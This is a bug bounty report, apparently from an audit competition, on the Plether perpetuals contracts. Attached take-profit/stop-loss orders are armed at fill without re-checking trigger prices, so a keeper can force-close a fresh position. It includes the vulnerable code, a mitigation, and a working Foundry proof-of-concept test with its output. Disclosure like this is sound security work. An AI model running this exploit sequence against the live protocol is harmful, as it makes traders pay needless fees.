# \#99931 [SC-Low] Attached TP/SL is armed at parent fill without re-checking trigger prices, so a leg already crossed at fill lets any keeper force-close the fresh position one block later

**Submitted on Nov 15th 2026 at 19:27:08 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99931
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

`PositionProtectionBook` refuses to arm a TP/SL whose trigger is already met at the current mark (`OrderRouter__ProtectionTriggerAlreadyMet`). For protection attached to an open order, that check runs only once, at commit, against the commit-time mark. When the parent open fills, `afterOrderTerminal` arms the protection without checking the trigger prices against the post-fill mark. If the price gaps between commit and fill past one leg (TP or SL), the protection is armed already crossed. In the next block any keeper triggers it, takes the trader's trigger bounty, and closes the position at the same price. The trader loses about 80 USDG per 100k notional (open fee + close fee + VPI + bounty) and never actually holds the position.

### Vulnerability Details

**1. Standalone create checks the trigger against the current mark.** `PositionProtectionBook.sol:229-231`:
```solidity
(uint256 cachedMarkPrice, uint256 currentMarkPrice, uint64 currentPublishTime) = _freshProtectionObservation();
@> _validateProtectionPrices(position.side, currentMarkPrice, params);
_validatePostLockRisk(account, position, cachedMarkPrice);
```
`_validateProtectionPrices` reverts when a leg is already met (`PositionProtectionBook.sol:933-939`):
```solidity
bool alreadyTriggered = side == CfdTypes.Side.LONG
    ? (takeProfit != 0 && markPrice <= takeProfit) || (stopLoss != 0 && markPrice >= stopLoss)
    : (takeProfit != 0 && markPrice >= takeProfit) || (stopLoss != 0 && markPrice <= stopLoss);
@> if (alreadyTriggered) revert OrderRouter__ProtectionTriggerAlreadyMet();
```

**2. Attached protection is checked only at commit.** `PositionProtectionBook.sol:463-464` (`_stageAttached`):
```solidity
(, uint256 currentMarkPrice,) = _freshProtectionObservation();
@> _validateProtectionPrices(side, currentMarkPrice, params);   // commit-time mark only
```

**3. Parent fill arms with no re-check.** `PositionProtectionBook.sol:596-604`:
```solidity
if (terminalStatus == IOrderRouterAccounting.OrderStatus.Executed) {
    _requireMatchingPosition(parentProtection);
    if (!_acceptedMarkInstalled()) { _failPendingParent(parentProtection); return; }
@>  _arm(parentProtection, ENGINE.lastMarkTime());   // no _validateProtectionPrices vs post-fill mark
    _emitArmed(parentProtection);
    return;
}
```

The parent fills at a later oracle tick, and the engine mark moves to the fill price. The trader cannot prevent a fill on the crossing side. A LONG open's limit is only a lower bound (`exec >= targetPrice`), while a LONG TP sits below the mark and a LONG SL above it. SHORT is symmetric.

### Impact Details

PoC with release params (exec fee 4 bp, vpiFactor 0.01, MM 0.1% / IM 0.2%), LONG 100k notional, margin 5,000 USDG, trigger bounty 0.30 USDG:

| Case | Commit mark | Fill mark | TP / SL | Trader loss | Keeper gain |
|---|---|---|---|---|---|
| TP crossed | 1.000 | 0.985 | 0.990 / 1.030 | **79.39 USDG** | 0.50 USDG |
| SL crossed | 1.000 | 1.015 | 0.970 / 1.010 | **81.80 USDG** | 0.50 USDG |

- The loss scales linearly with notional (about 800 USDG per 1M).
- The same params passed to `createPositionProtection` at the post-fill mark revert with `ProtectionTriggerAlreadyMet` (shown in the PoC), so the two paths enforce different rules for the same protection.
- No protocol or LP loss. The loss falls on the trader, who pays a full round trip on a position closed by an outside keeper one block after it opened.

### Mitigation

In `afterOrderTerminal`, before `_arm` (`PositionProtectionBook.sol:600`), run the trigger check against `ENGINE.lastMarkPrice()`. If a leg is already met, either fail the protection and refund its bounty (`_failPendingParent`), or let the trader set a fill bound on the crossing side so the parent open fails instead of filling past an attached leg.

### References

- `packages/perps/src/PositionProtectionBook.sol:229-231`: standalone `_create` validates trigger vs current mark
- `packages/perps/src/PositionProtectionBook.sol:463-464`: `_stageAttached` validates only at commit
- `packages/perps/src/PositionProtectionBook.sol:596-604`: `afterOrderTerminal` arms without re-validation
- `packages/perps/src/PositionProtectionBook.sol:933-939`: `ProtectionTriggerAlreadyMet` check
- `packages/perps/SECURITY.md:1278`: attached protection inherits the parent's *risk* decision
- Cecuro report `audits/plether-ai-audit-report-2026-10-26.pdf`, MED-28 (fix `8f6cfd3d` covers staging only)

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/oe-attached-arming-hooks.t.sol` and run:

```
forge test --root packages/perps --match-path test/oe-attached-arming-hooks.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice OE#33 PoC: an attached TP/SL is armed on parent fill without re-running PPB:_validateProtectionPrices
///         against the post-fill mark. A leg that is already crossed at fill is armed and any keeper can trigger it
///         in the next block, force-closing the fresh position and collecting the trader's trigger bounty.
contract OeCrossedArmPoCTest is BasePerpTest {
    address internal constant TRADER = address(0xA11CE);
    address internal constant KEEPER = address(0xBEEF0001);

    IPositionProtectionActions internal protection;
    IPositionProtectionViews internal views;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Release economics: MM 0.1%, IM 0.2%, FAD 3%, vpiFactor 0.01, maxSkew 0.4
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 300_000e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.positionProtectionTriggerBountyAssets = 300_000; // 0.30 USDG
        config.orderSettlementWindow = config.maxExecutionWindowSeconds;
        _setRouterConfig(config);
        protection = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        _refresh(1e8);
        _fundTrader(TRADER, 50_000e6);
    }

    function _live(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        if (previous >= vm.getBlockTimestamp()) previous = vm.getBlockTimestamp() - 1;
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refresh(uint256 price) internal {
        _mockPythUpdateData(price);
        router.updateMarkPrice(_live(price));
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin)
        internal
        view
        returns (OrderV3Types.OrderRequest memory r)
    {
        r.clientOrderId = keccak256(abi.encode("poc", router.nextCommitId()));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = side == CfdTypes.Side.LONG ? 1 : type(uint256).max; // no limit
        uint256 w = router.maxExecutionWindowSeconds();
        r.bounds.submitBy = uint64(vm.getBlockTimestamp() + w);
        r.bounds.executionWindowSeconds = uint32(w);
        r.bounds.allowedExecutionModes = 7;
        r.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        r.bounds.maxExecutionBountyAssets = type(uint256).max;
        r.bounds.maxExecutionNotionalAssets = type(uint256).max;
        r.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        r.bounds.maxActionChargeAssets = type(uint256).max;
        r.bounds.maxExplicitFeesAssets = type(uint256).max;
        r.bounds.maxPostPositionSize = type(uint256).max;
        r.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _limits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _equity(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + engine.traderClaimBalanceAssets(a);
    }

    function _run(uint256 fillPrice, uint256 tp, uint256 sl) internal returns (uint256 loss, uint256 keeperGain) {
        uint256 eq0 = _equity(TRADER);
        uint256 keeper0 = _equity(KEEPER);

        // 1. Trader commits a 100k-notional LONG with attached TP/SL validated against mark 1.00.
        //    (LONG profits when the basket FALLS: TP below mark, SL above.)
        OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, 100_000e18, 5_000e6);
        PositionProtectionTypes.PositionProtectionParams memory pp = PositionProtectionTypes.PositionProtectionParams({
            takeProfitTriggerPrice: tp, stopLossTriggerPrice: sl, closeLimits: _limits()
        });
        vm.prank(TRADER);
        (uint64 parentId, uint64 pid) = protection.commitOpenOrderWithProtection(req, pp);

        // 2. First publication after commit gapped to fillPrice; keeper fills the parent there.
        bytes[] memory fillData = _mockPythUpdateData(fillPrice);
        vm.prank(KEEPER);
        router.executeOrder(parentId, fillData);

        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 100_000e18, "parent filled");
        PositionProtectionTypes.PositionProtectionView memory v = views.getPositionProtection(pid);
        assertEq(uint256(v.status), uint256(PositionProtectionTypes.PositionProtectionStatus.Armed), "armed on fill");
        uint256 mark = engine.lastMarkPrice();
        assertEq(mark, fillPrice, "post-fill mark");
        bool crossed = (tp != 0 && mark <= tp) || (sl != 0 && mark >= sl);
        assertTrue(crossed, "a leg is already crossed at arming");

        // 3. The very same params are rejected by the standalone create path at this mark.
        uint256 snap = vm.snapshotState();
        _refresh(fillPrice); // fresh mark at the unchanged post-fill price (avoids PriceOutOfOrder)
        vm.prank(TRADER);
        protection.cancelPositionProtection(pid);
        vm.prank(TRADER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionTriggerAlreadyMet.selector);
        protection.createPositionProtection(pp);
        vm.revertToState(snap);

        // 4. Next block, price unchanged: any keeper triggers the protection and takes the trader's bounty.
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _mockPythUpdateData(fillPrice);
        bytes[] memory trig = _live(fillPrice);
        vm.prank(KEEPER);
        uint64 closeId = protection.triggerPositionProtection(pid, trig);

        // 5. The forced close executes at the same price.
        bytes[] memory closeData = _mockPythUpdateData(fillPrice);
        vm.prank(KEEPER);
        router.executeOrder(closeId, closeData);
        (size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "position force-closed by keeper-triggered protection");

        loss = eq0 - _equity(TRADER);
        keeperGain = _equity(KEEPER) - keeper0;
    }

    /// TP crossed: basket gaps from 1.000 to 0.985 between commit and first publication.
    function test_CrossedTakeProfitArmedAndInstantlyTriggered() public {
        (uint256 loss, uint256 keeperGain) = _run(0.985e8, 0.99e8, 1.03e8);
        console2.log("TP case: trader round-trip loss (USDG atoms)", loss);
        console2.log("TP case: keeper gain (USDG atoms)", keeperGain);
        assertGt(loss, 0);
    }

    /// SL crossed: basket gaps from 1.000 to 1.015; SL at 1.01 is armed already met and stops the trader out.
    function test_CrossedStopLossArmedAndInstantlyTriggered() public {
        (uint256 loss, uint256 keeperGain) = _run(1.015e8, 0.97e8, 1.01e8);
        console2.log("SL case: trader round-trip loss (USDG atoms)", loss);
        console2.log("SL case: keeper gain (USDG atoms)", keeperGain);
        assertGt(loss, 0);
    }
}
```

Result (actually run, `forge test --root packages/perps --match-path test/oe-attached-arming-hooks.t.sol -vv`):

```
Ran 2 tests for test/oe-attached-arming-hooks.t.sol:OeCrossedArmPoCTest
[PASS] test_CrossedStopLossArmedAndInstantlyTriggered() (gas: 4683247)
Logs:
  SL case: trader round-trip loss (USDG atoms) 81796427
  SL case: keeper gain (USDG atoms) 500000

[PASS] test_CrossedTakeProfitArmedAndInstantlyTriggered() (gas: 4683021)
Logs:
  TP case: trader round-trip loss (USDG atoms) 79385534
  TP case: keeper gain (USDG atoms) 500000

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

